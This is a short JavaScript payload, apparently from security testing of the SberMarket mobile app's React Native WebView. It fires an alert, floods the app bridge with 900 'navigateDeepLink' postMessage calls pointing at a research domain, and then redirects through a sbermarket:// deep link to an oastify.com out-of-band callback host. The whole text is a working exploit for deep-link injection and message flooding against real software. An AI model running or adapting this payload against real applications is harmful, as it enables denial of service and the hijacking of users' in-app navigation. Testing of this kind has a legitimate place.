alert('test_js2');
for(let i=0; i<900; i++) {
  window.ReactNativeWebView.postMessage(JSON.stringify({
  action: 'navigateDeepLink',
  data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
  }));
}
window.location = "sbermarket://landing?url=https://176oahio3qfi2mkiwmi9n91v4mady5zto.oastify.com";
